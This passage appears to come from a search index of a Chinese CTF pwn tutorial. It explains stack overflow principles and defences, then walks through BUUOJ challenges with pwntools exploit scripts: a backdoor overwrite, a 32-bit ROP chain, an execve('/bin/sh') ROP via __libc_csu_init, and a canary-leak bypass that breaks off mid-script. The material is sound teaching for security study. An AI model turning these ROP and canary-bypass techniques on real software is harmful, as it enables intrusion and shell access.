<p>\u6808\u7a7a\u95f4\u662f\u6709\u9650\u7684\uff0c\u5f53\u7a0b\u5e8f\u6ca1\u6709\u6b63\u786e\u68c0\u67e5\u8f93\u5165\u5927\u5c0f\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8f93\u5165\u8d85\u8fc7\u6808\u7a7a\u95f4\u9650\u5236\u7684\u6570\u636e\uff0c\u5bfc\u81f4\u6808\u4e0a\u7684\u6570\u636e\u88ab\u8986\u76d6\uff0c\u751a\u81f3\u6539\u53d8\u7a0b\u5e8f\u63a7\u5236\u6d41</p>"},{"location":"Pwn/Chapter1/#\u6808\u6ea2\u51fa\u6f0f\u6d1e\u539f\u7406","title":"\u6808\u6ea2\u51fa\u6f0f\u6d1e\u539f\u7406","text":"<p>\u6808\u6ea2\u51fa\u53d1\u751f\u7684\u57fa\u672c\u539f\u7406\u662f\uff0c\u7a0b\u5e8f\u6ca1\u6709\u6b63\u786e\u68c0\u67e5\u8f93\u5165\u6570\u636e\u7684\u957f\u5ea6\uff0c\u5bfc\u81f4\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u8986\u76d6\u6808\u4e0a\u7684\u91cd\u8981\u5185\u5bb9</p> <p>\u4f8b\u5982\uff0c\u51fd\u6570\u5185\u90e8\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5c40\u90e8\u6570\u7ec4\uff0c\u4f46\u6ca1\u6709\u9650\u5236\u5176\u957f\u5ea6\uff1a</p> <pre><code>void vulnerable_function(char *user_input) {\n    char buffer[100];\n    strcpy(buffer, user_input);  // \u4e0d\u5b89\u5168\u7684strcpy\uff0c\u7f3a\u4e4f\u8fb9\u754c\u68c0\u67e5\n}\n</code></pre> <p>\u5982\u679c <code>user_input</code> \u7684\u957f\u5ea6\u8d85\u8fc7 <code>buffer</code> \u7684\u5bb9\u91cf\uff08100\u4e2a\u5b57\u8282\uff09\uff0c\u5c31\u4f1a\u53d1\u751f\u6808\u6ea2\u51fa\uff0c\u6570\u636e\u4f1a\u6ea2\u51fa\u5230\u6808\u4e0a\u7684\u5176\u4ed6\u533a\u57df\uff0c\u8986\u76d6\u539f\u672c\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u3001\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u7b49\u4fe1\u606f\u7684\u7a7a\u95f4</p> <p>\u8fd9\u65f6\u5019\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236\u6ea2\u51fa\u6570\u636e\u7684\u5185\u5bb9\u6765\u64cd\u63a7\u7a0b\u5e8f\u7684\u6267\u884c\uff0c\u5bfc\u81f4\u4ee3\u7801\u6ce8\u5165\u3001\u6743\u9650\u63d0\u5347\u3001\u4fe1\u606f\u6cc4\u9732\u7b49\u5b89\u5168\u95ee\u9898</p>"},{"location":"Pwn/Chapter1/#\u6808\u6ea2\u51fa\u7684\u653b\u51fb\u65b9\u5f0f","title":"\u6808\u6ea2\u51fa\u7684\u653b\u51fb\u65b9\u5f0f","text":"<p>\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff08Return Address Overwrite\uff09</p> <p>\u6808\u6ea2\u51fa\u653b\u51fb\u7684\u7ecf\u5178\u65b9\u6cd5\u662f\u8986\u76d6\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740</p> <p>\u5f53\u4e00\u4e2a\u51fd\u6570\u8c03\u7528\u7ed3\u675f\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8df3\u8f6c\u5230\u8fd4\u56de\u5730\u5740</p> <p>\u4f46\u662f\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6808\u6ea2\u51fa\u5c06\u8fd9\u4e2a\u8fd4\u56de\u5730\u5740\u4fee\u6539\u4e3a\u653b\u51fb\u8005\u63a7\u5236\u7684\u5730\u5740</p> <p>\u8fd9\u6837\uff0c\u653b\u51fb\u8005\u5c31\u80fd\u8ba9\u7a0b\u5e8f\u8df3\u8f6c\u5230\u81ea\u5df1\u7684\u6076\u610f\u4ee3\u7801</p> <p>\u4f8b\u5982\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u8f93\u5165\u6570\u636e\u6784\u9020\u4e3a\u8fd9\u6837\u4e00\u79cd\u5f62\u5f0f\uff1a</p> <ul> <li>\u8f93\u5165\u6570\u636e\u7684\u524d 100 \u4e2a\u5b57\u8282\u7528\u6765\u586b\u5145\u6808\u7f13\u51b2\u533a</li> <li>\u7136\u540e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u63a5\u4e0b\u6765\u7684\u5b57\u8282\u586b\u5145\u6210\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740</li> </ul> <p>\u4e00\u65e6\u51fd\u6570\u8fd4\u56de\uff0c\u7a0b\u5e8f\u5c06\u8df3\u8f6c\u5230\u653b\u51fb\u8005\u63a7\u5236\u7684\u5185\u5b58\u4f4d\u7f6e\uff0c\u4ece\u800c\u6267\u884c\u6076\u610f\u4ee3\u7801</p> <p>\u4ee3\u7801\u6ce8\u5165\uff08Code Injection\uff09</p> <p>\u653b\u51fb\u8005\u4e0d\u4ec5\u53ef\u4ee5\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u8fd8\u53ef\u4ee5\u5728\u6808\u4e0a\u6ce8\u5165\u6076\u610f\u4ee3\u7801</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u6ea2\u51fa\u7684\u6570\u636e\u4e2d\u5199\u5165\u81ea\u5df1\u7684\u673a\u5668\u7801\uff08\u5373\u201cshellcode\u201d\uff09</p> <p>\u7136\u540e\u901a\u8fc7\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u5c06\u7a0b\u5e8f\u7684\u63a7\u5236\u6d41\u8df3\u8f6c\u5230\u8fd9\u4e2a shellcode \u4e0a\uff0c\u4ece\u800c\u6267\u884c\u4efb\u610f\u4ee3\u7801</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>void vulnerable_function(char *user_input) {\n    char buffer[100];\n    strcpy(buffer, user_input);  // \u4e0d\u5b89\u5168\u7684strcpy\uff0c\u7f3a\u4e4f\u8fb9\u754c\u68c0\u67e5\n}\n</code></pre> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u5c06 <code>user_input</code> \u8bbe\u4e3a\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684 shellcode\uff0c\u5e76\u901a\u8fc7\u6808\u6ea2\u51fa\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u4f7f\u7a0b\u5e8f\u6267\u884c\u8fd9\u4e9b\u6076\u610f\u4ee3\u7801</p> <p>\u5806\u6808\u6cc4\u9732\uff08Stack Leaks\uff09</p> <p>\u9664\u4e86\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u5916\uff0c\u6808\u6ea2\u51fa\u8fd8\u53ef\u4ee5\u5bfc\u81f4\u4fe1\u606f\u6cc4\u9732</p> <p>\u901a\u8fc7\u63a7\u5236\u6ea2\u51fa\u6570\u636e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u8bfb\u53d6\u6808\u4e0a\u7684\u4fe1\u606f\uff0c\u751a\u81f3\u6cc4\u9732\u7a0b\u5e8f\u7684\u654f\u611f\u6570\u636e\uff0c\u5982\u5bc6\u7801\u3001\u5bc6\u94a5\u7b49</p> <p>\u6808\u6ea2\u51fa\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u83b7\u5f97\u6808\u5e27\u4e2d\u7684\u5185\u5bb9\uff0c\u5229\u7528\u8fd9\u4e9b\u4fe1\u606f\u8fdb\u4e00\u6b65\u6e17\u900f\u7cfb\u7edf</p>"},{"location":"Pwn/Chapter1/#\u6808\u6ea2\u51fa\u7684\u5229\u7528","title":"\u6808\u6ea2\u51fa\u7684\u5229\u7528","text":"<p>\u6808\u6ea2\u51fa\u7684\u5229\u7528\u8fc7\u7a0b\u901a\u5e38\u5305\u62ec\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4\uff1a</p> <ol> <li>\u5bfb\u627e\u6ea2\u51fa\u70b9\uff1a\u653b\u51fb\u8005\u9996\u5148\u9700\u8981\u627e\u5230\u4e00\u4e2a\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\u7684\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee3\u7801\u5ba1\u8ba1\u3001Fuzz \u6d4b\u8bd5\u7b49\u65b9\u6cd5\u53d1\u73b0\u7a0b\u5e8f\u4e2d\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684\u5730\u65b9</li> <li>\u6784\u9020\u6ea2\u51fa\u6570\u636e\uff1a\u653b\u51fb\u8005\u6839\u636e\u6808\u7684\u5e03\u5c40\uff0c\u6784\u9020\u5305\u542b\u6076\u610f\u6570\u636e\u7684\u8f93\u5165\uff0c\u8fd9\u4e2a\u8f93\u5165\u5305\u62ec\uff1a</li> <li>\u586b\u5145\u6570\u636e\uff0c\u7528\u4e8e\u8986\u76d6\u6808\u4e0a\u7684\u5c40\u90e8\u53d8\u91cf</li> <li>\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u5c06\u5176\u6539\u4e3a\u653b\u51fb\u8005\u63a7\u5236\u7684\u5185\u5b58\u5730\u5740</li> <li>\u53ef\u9009\u7684\u4ee3\u7801\u6ce8\u5165\u6570\u636e\uff0c\u4f5c\u4e3a\u6076\u610f\u4ee3\u7801\u6216 shellcode</li> <li>\u6267\u884c\u653b\u51fb\uff1a\u5f53\u653b\u51fb\u8005\u6210\u529f\u63a7\u5236\u8fd4\u56de\u5730\u5740\u6216\u6808\u4e0a\u7684\u5173\u952e\u6570\u636e\u540e\uff0c\u7a0b\u5e8f\u5c06\u5728\u8fd4\u56de\u65f6\u8df3\u8f6c\u5230\u6076\u610f\u4ee3\u7801\uff08\u5982 shellcode\uff09\u7684\u4f4d\u7f6e\uff0c\u5b8c\u6210\u653b\u51fb</li> </ol>"},{"location":"Pwn/Chapter1/#\u9632\u5fa1\u6808\u6ea2\u51fa\u6f0f\u6d1e","title":"\u9632\u5fa1\u6808\u6ea2\u51fa\u6f0f\u6d1e","text":"<p>\u4e3a\u4e86\u9632\u6b62\u6808\u6ea2\u51fa\u653b\u51fb\uff0c\u8bb8\u591a\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u548c\u7f16\u8bd1\u5668\u63d0\u4f9b\u4e86\u4e00\u4e9b\u9632\u62a4\u63aa\u65bd\uff1a</p>"},{"location":"Pwn/Chapter1/#\u6808\u4fdd\u62a4stack-canaries","title":"\u6808\u4fdd\u62a4\uff08Stack Canaries\uff09","text":"<p>\u6808\u4fdd\u62a4\u673a\u5236\uff08\u4e5f\u79f0\u4e3a\u6808\u91d1\u4e1d\u96c0\uff09\u901a\u8fc7\u5728\u6bcf\u4e2a\u6808\u5e27\u4e2d\u63d2\u5165\u4e00\u4e2a\u968f\u673a\u503c\uff08\u201ccanary\u201d\uff09\u6765\u9632\u6b62\u6808\u6ea2\u51fa\u653b\u51fb</p> <p>\u6808\u5e27\u7684\u8fd4\u56de\u5730\u5740\u548c\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u524d\u4f1a\u63d2\u5165\u8fd9\u4e2a\u968f\u673a\u503c\uff0c\u5728\u51fd\u6570\u8fd4\u56de\u4e4b\u524d\uff0c\u7a0b\u5e8f\u4f1a\u68c0\u67e5\u6808\u91d1\u4e1d\u96c0\u503c\u662f\u5426\u88ab\u7be1\u6539</p> <p>\u5982\u679c\u88ab\u7be1\u6539\uff0c\u5219\u8bf4\u660e\u53d1\u751f\u4e86\u6808\u6ea2\u51fa\uff0c\u7a0b\u5e8f\u4f1a\u7ec8\u6b62\u6267\u884c</p> <p>\u4f8b\u5982\uff0cGCC \u7f16\u8bd1\u5668\u63d0\u4f9b\u7684 <code>-fstack-protector</code> \u9009\u9879\u53ef\u4ee5\u542f\u7528\u6808\u4fdd\u62a4</p>"},{"location":"Pwn/Chapter1/#\u5730\u5740\u7a7a\u95f4\u5e03\u5c40\u968f\u673a\u5316aslr","title":"\u5730\u5740\u7a7a\u95f4\u5e03\u5c40\u968f\u673a\u5316\uff08ASLR\uff09","text":"<p>ASLR \u662f\u4e00\u79cd\u901a\u8fc7\u968f\u673a\u5316\u5185\u5b58\u4e2d\u5173\u952e\u533a\u57df\uff08\u5982\u6808\u3001\u5806\u3001\u5171\u4eab\u5e93\u7b49\uff09\u7684\u5730\u5740\u6765\u589e\u5f3a\u5b89\u5168\u6027\u7684\u6280\u672f</p> <p>\u901a\u8fc7\u542f\u7528 ASLR\uff0c\u653b\u51fb\u8005\u5f88\u96be\u9884\u6d4b\u6808\u4e0a\u7684\u8fd4\u56de\u5730\u5740\uff0c\u4ece\u800c\u4f7f\u6808\u6ea2\u51fa\u653b\u51fb\u66f4\u52a0\u56f0\u96be</p>"},{"location":"Pwn/Chapter1/#\u6570\u636e\u6267\u884c\u4fdd\u62a4dep\u6267\u884c\u7981\u6b62nx","title":"\u6570\u636e\u6267\u884c\u4fdd\u62a4\uff08DEP\uff09/\u6267\u884c\u7981\u6b62\uff08NX\uff09","text":"<p>\u6570\u636e\u6267\u884c\u4fdd\u62a4\uff08DEP\uff09\u901a\u8fc7\u7981\u6b62\u7a0b\u5e8f\u5728\u6570\u636e\u533a\u57df\uff08\u5982\u5806\u3001\u6808\uff09\u4e0a\u6267\u884c\u4ee3\u7801\u6765\u9632\u6b62\u4ee3\u7801\u6ce8\u5165\u653b\u51fb</p> <p>\u542f\u7528 DEP \u540e\uff0c\u653b\u51fb\u8005\u65e0\u6cd5\u901a\u8fc7\u6808\u6ea2\u51fa\u5728\u6808\u4e0a\u6267\u884c shellcode\uff0c\u56e0\u4e3a\u6808\u533a\u57df\u7684\u5185\u5b58\u662f\u4e0d\u53ef\u6267\u884c\u7684</p>"},{"location":"Pwn/Chapter1/#\u4f7f\u7528\u5b89\u5168\u7684\u7f16\u7a0b\u51fd\u6570","title":"\u4f7f\u7528\u5b89\u5168\u7684\u7f16\u7a0b\u51fd\u6570","text":"<p>\u5c3d\u91cf\u907f\u514d\u4f7f\u7528\u4e0d\u5b89\u5168\u7684\u5b57\u7b26\u4e32\u64cd\u4f5c\u51fd\u6570\uff08\u5982 <code>strcpy</code>\u3001<code>sprintf</code> \u7b49\uff09\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>snprintf</code>\u3001<code>strncpy</code> \u7b49\u5e26\u6709\u8fb9\u754c\u68c0\u67e5\u7684\u51fd\u6570</p> <p>\u6b64\u5916\uff0c\u4f7f\u7528\u73b0\u4ee3\u7f16\u7a0b\u8bed\u8a00\uff08\u5982 Python\u3001Java\uff09\u53ef\u4ee5\u907f\u5f00\u8bb8\u591a\u6808\u6ea2\u51fa\u6f0f\u6d1e</p>"},{"location":"Pwn/Chapter1/#\u5806\u6808\u9694\u79bbstack-isolation","title":"\u5806\u6808\u9694\u79bb\uff08Stack Isolation\uff09","text":"<p>\u67d0\u4e9b\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u4f7f\u7528\u5806\u6808\u9694\u79bb\u6280\u672f\u6765\u9632\u6b62\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684\u5229\u7528</p> <p>\u4f8b\u5982\uff0c\u67d0\u4e9b\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u5bf9\u6808\u548c\u5806\u8fdb\u884c\u7269\u7406\u9694\u79bb\uff0c\u4f7f\u5f97\u653b\u51fb\u8005\u4e0d\u80fd\u901a\u8fc7\u6808\u6ea2\u51fa\u6765\u8bbf\u95ee\u5806\u4e0a\u7684\u6570\u636e</p>"},{"location":"Pwn/Chapter1/#\u603b\u7ed3","title":"\u603b\u7ed3","text":"<p>\u6808\u6ea2\u51fa\u6f0f\u6d1e\u662f\u4e00\u79cd\u4e25\u91cd\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u901a\u5e38\u53ef\u4ee5\u901a\u8fc7\u8986\u76d6\u6808\u4e0a\u7684\u8fd4\u56de\u5730\u5740\u6765\u5b9e\u73b0\u63a7\u5236\u6d41\u52ab\u6301\uff0c\u4ece\u800c\u6267\u884c\u6076\u610f\u4ee3\u7801</p> <p>\u9632\u8303\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684\u5173\u952e\u5728\u4e8e\u4f7f\u7528\u5b89\u5168\u7684\u7f16\u7a0b\u5b9e\u8df5\u3001\u5f00\u542f\u6808\u4fdd\u62a4\u3001\u542f\u7528\u5730\u5740\u7a7a\u95f4\u5e03\u5c40\u968f\u673a\u5316\uff08ASLR\uff09\u7b49\u6280\u672f</p> <p>\u901a\u8fc7\u8fd9\u4e9b\u63aa\u65bd\uff0c\u80fd\u591f\u663e\u8457\u964d\u4f4e\u6808\u6ea2\u51fa\u6f0f\u6d1e\u88ab\u5229\u7528\u7684\u98ce\u9669</p>"},{"location":"Pwn/Chapter1/1-1/","title":"Gets \u6808\u6ea2\u51fa\uff08BackDoor \u51fd\u6570\uff09","text":""},{"location":"Pwn/Chapter1/1-1/#gets-\u6808\u6ea2\u51fabackdoor-\u51fd\u6570","title":"Gets \u6808\u6ea2\u51fa\uff08BackDoor \u51fd\u6570\uff09","text":"<p>IDA64 \u53cd\u7f16\u8bd1</p> <p></p> <p>\u7ed9\u51fa\u4e86\u540e\u95e8\u51fd\u6570</p> <p></p> <p>\u770b\u5185\u5b58\u6ea2\u51fa\u5927\u5c0f\u662f 72</p> <p></p> <p>\u6784\u9020 payload</p> <pre><code>from pwn import *\n\np = remote(\"node5.buuoj.cn\", 27079)\n\npayload = b'a' * 72 + p64(0x40060D)\n\np.sendline(payload)\np.interactive()\n</code></pre> <p>\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter1/1-10/","title":"32 \u4f4d\u8fde\u7eed ROP","text":""},{"location":"Pwn/Chapter1/1-10/#32-\u4f4d\u8fde\u7eed-rop","title":"32 \u4f4d\u8fde\u7eed ROP","text":"<p>\u5728 main \u51fd\u6570\u4e2d\u53d1\u73b0\u6f0f\u6d1e\u51fd\u6570</p> <p></p> <p>\u660e\u663e\u6808\u6ea2\u51fa</p> <p></p> <p>\u6709\u4e2a flag \u51fd\u6570\uff0c\u8981\u6c42\u662f win1\u3001win2 \u4e3a\u771f\u4e14 a1 \u7b49\u4e8e\u4e00\u4e2a\u503c</p> <p></p> <p>\u9009\u4e2d\u6570\u503c\u53f3\u952e Hexdecimal \u8f6c\u4e3a\u5341\u516d\u8fdb\u5236 0xDEADBAAD</p> <p></p> <p>\u51fd\u6570 function1 \u4e2d\u5b9a\u4e49\u7684 win1 \u7684\u503c</p> <p></p> <p>\u5728 function2 \u4e2d\u6211\u4eec\u8981\u4f20\u5165 a1 = 0xBAAAAAAD</p> <p></p> <p>\u56de\u60f3 32 \u4f4d ROP \u65b9\u5f0f\u662f\u51fd\u6570 + \u8fd4\u56de\u5730\u5740 + \u53c2\u6570</p> <p>\u5219 win1 \u7684\u8fd4\u56de\u5730\u5740\u662f win2\uff0cwin2 \u8fd4\u56de\u5730\u5740\u662f flag</p> <p>\u6784\u9020 payload</p> <pre><code>from pwn import *\n\nsh = remote('node5.buuoj.cn',27251)\n\na1_win2 = 0xBAAAAAAD\na1_flag = 0xDEADBAAD\nwin1 = 0x80485cb\nwin2 = 0x80485d8\nflag = 0x804862b\n\npayload = b'a'*(0x18 + 4) + p32(win1) + p32(win2) + p32(flag) + p32(a1_win2) + p32(a1_flag)\n\nsh.sendline(payload)\nsh.interactive()\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter1/1-11/","title":"__libc_csu_init ROP","text":""},{"location":"Pwn/Chapter1/1-11/#__libc_csu_init-rop","title":"__libc_csu_init ROP","text":"<p>buf \u7ed9\u7684\u5927\u5c0f\u8fc7\u591a\uff0c\u660e\u663e\u6808\u6ea2\u51fa</p> <p></p> <p>\u786e\u8ba4\u5927\u5c0f\uff0c\u4f46\u662f\u6ca1\u6709\u627e\u5230\u53ef\u5229\u7528\u5b57\u7b26\u4e32\u53ca\u80fd\u6cc4\u9732 libc \u7684\u51fd\u6570</p> <p></p> <p>\u6c47\u7f16\u4e0b\u5206\u6790 vuln \u51fd\u6570\u53d1\u73b0\u7f3a\u5c11\u4e86 leave \u6307\u4ee4\uff08\u53ef\u53c2\u8003\u6808\u8fc1\u79fb\u90a3\u4e00\u8282\uff09</p> <p>\u6240\u4ee5\u51fd\u6570\u8c03\u7528\u5b8c\u6bd5\u540e\u5e76\u4e0d\u4f1a\u6e05\u7a7a\u6808</p> <p></p> <p>\u56e0\u4e3a vunl \u51fd\u6570\u6700\u540e\u8c03\u7528\u4e86 write \u51fd\u6570\u8f93\u51fa 20 \u5b57\u8282\u6570\u636e\uff0c\u6240\u4ee5\u53ef\u4ee5\u5148\u6cc4\u9732 buf \u5730\u5740</p> <pre><code>from pwn import *\n\np = process('./ciscn_s_3')\ngdb.attach(p)\n\nvul_addr = 0x4004ed\n\npayload = b'a' * 0x10 + p64(vul_addr)\n\np.send(payload)\np.recv(0x20)\n\nstack_addr = u64(p.recv(8))\n\nprint(hex(stack_addr))\n</code></pre> <p>\u6309 ni \u6216 si \u8ddf\u8fdb</p> <p></p> <p>\u6700\u540e\u8f93\u5165 exit \u9000\u51fa\u62ff\u5230\u6253\u5370\u7684\u5730\u5740</p> <p></p> <p>\u76f8\u51cf\u5f97\u5230 0x148**\uff08\u9898\u76ee\u73af\u5883\u4e3a 0x118\uff09**</p> <p></p> <p>\u518d\u770b\u9898\u76ee\u4e2d\u7ed9\u7684 gadgets\uff0c\u5206\u522b\u5bf9 rax \u8d4b\u4e88\u4e86 0xf\uff08sigret\uff09, \u548c 0x3b\uff08execve\uff09</p> <p>\u56e0\u6b64\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u5206\u4e3a\u4e24\u79cd\u505a\u6cd5\uff0c\u76ee\u6807\u90fd\u662f\u63a7\u5236\u5bc4\u5b58\u5668\u7684\u503c\u6765\u6267\u884c execve</p> <p>\u5728 x86_64 \u67b6\u6784\u4e0b\uff0c<code>execve</code> \u7cfb\u7edf\u8c03\u7528\u7684\u53c2\u6570\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9012\uff1a</p> <ul> <li>rdi: <code>pathname</code> \u2014 <code>/bin/sh</code> \u7684\u5730\u5740</li> <li>rsi: <code>argv</code> \u2014 \u4f20\u9012\u7ed9\u7a0b\u5e8f\u7684\u53c2\u6570\uff08\u6b64\u5904\u4e3a <code>0</code>\uff09</li> <li>rdx: <code>envp</code> \u2014 \u73af\u5883\u53d8\u91cf\uff08\u6b64\u5904\u4e3a <code>0</code>\uff09</li> </ul> <p><code>__libc_csu_init</code> \u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u51fd\u6570\uff0c\u7528\u4e8e\u5728\u7a0b\u5e8f\u542f\u52a8\u65f6\u521d\u59cb\u5316\u9759\u6001\u5168\u5c40\u53d8\u91cf\u548c\u8fdb\u884c\u4e00\u4e9b\u5e93\u521d\u59cb\u5316\u5de5\u4f5c</p> <p>\u8fd9\u4e2a\u51fd\u6570\u901a\u5e38\u4f1a\u88ab\u653e\u7f6e\u5728\u7a0b\u5e8f\u7684\u53ef\u6267\u884c\u6587\u4ef6\u7684 <code>.init</code> \u6bb5\u4e2d</p> <p>\u5b83\u4e5f\u662f\u4e00\u79cd\u53ef\u4ee5\u5229\u7528\u7684 gadget\uff0c\u53ef\u4ee5\u7528\u6765\u63a7\u5236\u5bc4\u5b58\u5668</p> <p><code>__libc_csu_init</code> \u7684\u4f5c\u7528\uff1a \u8be5\u51fd\u6570\u901a\u5e38\u5305\u542b\u4e00\u4e9b\u5bf9\u5bc4\u5b58\u5668\u7684\u4fee\u6539\u64cd\u4f5c\uff0c\u5b83\u7684\u672b\u5c3e\u53ef\u80fd\u6b63\u597d\u662f\u4e00\u4e2a <code>pop</code> \u64cd\u4f5c\u6216\u7c7b\u4f3c\u7684\u6307\u4ee4\uff0c\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7\u94fe\u5f0f\u5229\u7528\uff08gadget chaining\uff09\u6765\u63a7\u5236 <code>rdi</code>\u3001<code>rsi</code> \u548c <code>rdx</code> \u5bc4\u5b58\u5668</p> <p></p> <p>\u63a5\u4e0b\u6765\u518d\u9020\u6210\u4e00\u6b21\u6ea2\u51fa\uff0c\u8fdb\u884c execve \u51fd\u6570\u8c03\u7528\uff0c\u7136\u540e\u53ea\u8981\u8ba9 rdi=/bin/sh\uff0crsi=0\uff0crdx=0 \u5373\u53ef\u83b7\u5f97 shell</p> <p>\u6ca1\u6709\u76f4\u63a5\u627e\u5230\u8bbe\u7f6e rdx \u5bc4\u5b58\u5668\u7684\u6307\u4ee4\uff0c\u4f46\u662f\u627e\u5230\u4e86\u6539\u53d8 rdx \u5bc4\u5b58\u5668\u65b9\u6cd5\u7684\u6307\u4ee4</p> <pre><code>mov rdx, r13\npop r13\n</code></pre> <p></p> <p>\u8bbe\u7f6e r13 \u5bc4\u5b58\u5668\u91cc\u7684\u503c\uff0c\u5b83\u5176\u5b9e\u662f\u6267\u884c\u4e86\u4e24\u4e2a\u6b65\u9aa4</p> <p>\u7b2c\u4e00\u6b65 mov\uff0c\u6539\u53d8 r13 \u7684\u503c\uff0c\u4e4b\u540e ret\uff0c\u8fdb\u884c\u5730\u5740\u8df3\u8f6c</p> <p>\u6211\u4eec\u53ef\u4ee5\u7528 pop r13 \u8fd9\u4e2a\u6307\u4ee4\uff0c\u5148\u5c06 r13 \u8bbe\u7f6e\u4e3a 0\uff0c\u53ea\u4f1a ret \u5230 mov rdx\uff0cr13\uff0c\u8fd9\u6837\u5c31\u5c06 rdx \u8bbe\u7f6e\u4e3a0\u4e86</p> <p>\u4f46\u662f\u5c06 rbx \u8bbe\u7f6e\u4e3a\u4e86 0\uff0c\u4e0b\u9762\u7684 call \u4f1a\u53d8\u6210\u6267\u884c call ptr[12]</p> <p></p> <p>\u6700\u540e\u53bb\u627e pop rid;</p> <p></p> <p>\u6784\u9020 payload</p> <pre><code>from pwn import *\n\nio = remote('node5.buuoj.cn',27324)\n\nmain = 0x0004004ED\nexecv = 0x04004E2\npop_rdi = 0x4005a3\npop_rbx_rbp_r12_r13_r14_r15 = 0x40059A\nmov_rdxr13_call = 0x0400580\nsys = 0x00400517\n\npl1 = b'/bin/sh\\x00' * 2 + p64(main)\n\nio.send(pl1)\nio.recv(0x20)\n\nsh = u64(io.recv(8)) - 280\n\npl2 = b'/bin/sh\\x00' * 2 + p64(pop_rbx_rbp_r12_r13_r14_r15) + p64(0) * 2 + p64(sh + 0x50) + p64(0) * 3\npl2 += p64(mov_rdxr13_call) + p64(execv)\npl2 += p64(pop_rdi) + p64(sh) + p64(sys)\n\nio.send(pl2)\nio.interactive()\n</code></pre>"},{"location":"Pwn/Chapter1/1-12/","title":"Canary \u6cc4\u9732\u7ed5\u8fc7","text":""},{"location":"Pwn/Chapter1/1-12/#canary-\u6cc4\u9732\u7ed5\u8fc7","title":"Canary \u6cc4\u9732\u7ed5\u8fc7","text":"<p>\u5148 checksec \u4e00\u4e0b\u53d1\u73b0\u5f00\u542f\u4e86 Canary \u53ca NX</p> <p></p> <p>\u53cd\u7f16\u8bd1\u5148\u770b main \u51fd\u6570</p> <p></p> <p>\u9996\u5148\u8c03\u7528\u4e86 init \u51fd\u6570\u6253\u5370\u4e86\u4e24\u53e5\u8bdd</p> <p></p> <p>\u518d\u662f gift \u51fd\u6570\uff0c\u8fd9\u91cc\u660e\u663e\u5b58\u5728\u5b57\u7b26\u4e32\u683c\u5f0f\u5316\u6f0f\u6d1e</p> <p></p> <p>\u6700\u540e\u662f vuln \u51fd\u6570</p> <p></p> <p>buf \u7f13\u51b2\u533a\u5b58\u5728\u6ea2\u51fa</p> <p></p> <p>\u5c1d\u8bd5\u5e38\u89c4\u65b9\u6cd5\u6cc4\u9732\u4f46\u4e0d\u884c</p> <p></p> <p>\u8f93\u5165 %n$p\uff08\u7528\u6cd5\u53c2\u8003 2.1\uff09</p> <p>\u53ef\u4ee5\u770b\u5230\u504f\u79fb\u662f 6</p> <p></p> <p>\u4f7f\u7528 gdb \u8c03\u8bd5\u53d1\u73b0\u5728\u5b57\u7b26\u4e32\u4e0b\u9762\u4e00\u884c\u5c31\u662f Canary \u7684\u503c</p> <p></p> <p>\u6240\u4ee5\u8f93\u5165 %7$p \u5c31\u80fd\u6cc4\u9732 Canary \u7684\u503c</p> <p></p> <p></p> <p>64 \u4f4d\u7cfb\u7edf\u8fd8\u9700\u8981\u4e00\u4e2a pop rdi;ret</p> <p></p> <p>Canary \u4fdd\u62a4\u4f1a\u4ece rbp-4 \u6216\u8005 rbp-8 \u7684\u4f4d\u7f6e\u53d6\u51fa\u5e76\u4e0e fs/gs \u5bc4\u5b58\u5668\u5bf9\u5e94\u4f4d\u7f6e\u7684\u503c\u8fdb\u884c\u6bd4\u8f83</p> <p>\u5982\u679c\u4e0d\u76f8\u7b49\u5c31\u4f1a\u6267\u884c __ stack_chk_fail \u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5f3a\u884c\u505c\u6b62\u7a0b\u5e8f\u8fd0\u884c\u5e76\u53d1\u51fa\u8b66\u544a\uff0c\u4ece\u800c\u963b\u6b62\u6808\u6ea2\u51fa\u653b\u51fb</p> <p>\u6240\u4ee5\u5728\u6700\u540e\u586b\u4e0a Canary \u7684\u503c\u6765\u7ed5\u8fc7</p> <pre><code>from pwn import *\nfrom LibcSearcher import *\n\nr = 